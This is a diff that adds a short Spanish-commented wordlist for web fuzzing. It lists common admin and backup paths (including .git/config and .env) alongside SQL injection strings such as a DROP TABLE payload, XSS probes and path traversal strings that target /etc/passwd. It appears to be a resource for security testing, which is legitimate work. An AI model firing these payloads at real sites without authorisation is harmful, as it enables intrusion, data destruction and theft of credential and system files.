@@ -1,0 +1,81 @@
+# payloads.txt — Wordlist para fuzzing web (usar con fuzzing.py u otros fuzzers).
+# Cada linea no comentada es un payload. El marcador FUZZ se sustituye en la URL/datos.
+
+# ── Descubrimiento de rutas y ficheros comunes ──
+admin
+administrator
+api
+api/v1
+backup
+config
+console
+css
+debug
+docs
+env
+error
+favicon.ico
+health
+images
+img
+index
+js
+json
+login
+logout
+manager
+old
+panel
+phpmyadmin
+private
+profile
+register
+robots.txt
+sitemap.xml
+sql
+static
+status
+swagger
+test
+tmp
+upload
+uploads
+user
+vendor
+wp-admin
+wp-content
+.zip
+.bak
+.git/config
+.env
+.php
+.sql
+
+# ── Valores de parametros (SQLi) ──
+' OR '1'='1
+' OR 1=1--
+" OR "1"="1
+1' AND '1'='1
+1 UNION SELECT NULL--
+1 UNION SELECT NULL,NULL--
+'; DROP TABLE users;--
+
+# ── Valores de parametros (XSS) ──
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+javascript:alert(1)
+
+# ── Path traversal / LFI ──
+../../../../etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+....//....//....//etc/passwd
+
+# ── Cabeceras / valores interesantes ──
+null
+undefined
+true
+false
+0
+-1
+999999999
